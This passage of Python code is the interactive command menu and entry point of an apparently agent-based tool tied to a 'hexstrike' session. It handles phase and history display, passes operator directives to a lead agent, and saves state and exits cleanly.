                    elif user_cmd == "/phase":
                        print(f"\n[PHASE]: {kb_dict['current_phase']}")
                        print(f"[HISTORY]: {len(lead_history)} messages")
                        print(f"[COMMANDS]: {len(executed_commands)} executed")
                        print(f"[KB SIZE]: {len(kb_to_str(kb_dict))} chars")
                        continue

                    elif user_cmd == "/history":
                        print(f"\n=== CONVERSATION HISTORY ({len(lead_history)} messages) ===")
                        for i, msg in enumerate(lead_history[-10:]):
                            src = getattr(msg, "source", "?")
                            content = getattr(msg, "content", str(msg))
                            preview = content[:200] + "…" if len(content) > 200 else content
                            print(f"  [{i}] ({src}): {preview}")
                        print("=" * 40)
                        continue

                    elif user_cmd == "/exit":
                        print("\n[*] Exiting tool…")
                        save_state(target_task, kb_dict, executed_commands, lead_history)
                        await hexstrike_session.close()
                        break

                    else:
                        # Free-text → operator directive
                        print("[>] Sending instruction to Lead…")
                        if "operator_directives" not in kb_dict:
                            kb_dict["operator_directives"] = []
                        kb_dict["operator_directives"].append(user_cmd)
                        kb_dict["operator_directives"] = kb_dict["operator_directives"][-5:]
                        lead_history.append(
                            TextMessage(
                                content=f"[OPERATOR DIRECTIVE]: {user_cmd}",
                                source="user",
                            )
                        )
                        auto_steps_remaining = 1

                except KeyboardInterrupt:
                    print("\n\nReturning to menu… (Type /exit to quit)")
                except Exception as exc:
                    print(f"Menu error: {exc}")


# ──────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Force quit detected. Goodbye!")
